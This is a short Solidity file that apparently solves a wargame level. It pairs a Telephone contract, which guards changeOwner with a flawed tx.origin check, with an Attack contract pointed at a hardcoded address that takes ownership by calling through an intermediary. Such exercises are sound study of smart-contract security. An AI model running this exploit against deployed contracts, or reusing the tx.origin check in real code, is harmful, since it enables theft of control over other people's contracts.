// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attack {
  Telephone attack = Telephone (0x4c00718Abb77B5F3d0AF2B7bf7c1D13dB525774D);

  function callChangeOwner() public {
    attack.changeOwner (msg.sender);
  }
}

contract Telephone {

  address public owner;

  constructor() {
    owner = msg.sender;
  }
  
  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }

  function getOwner() public view returns (address){
    return owner;
  }
}
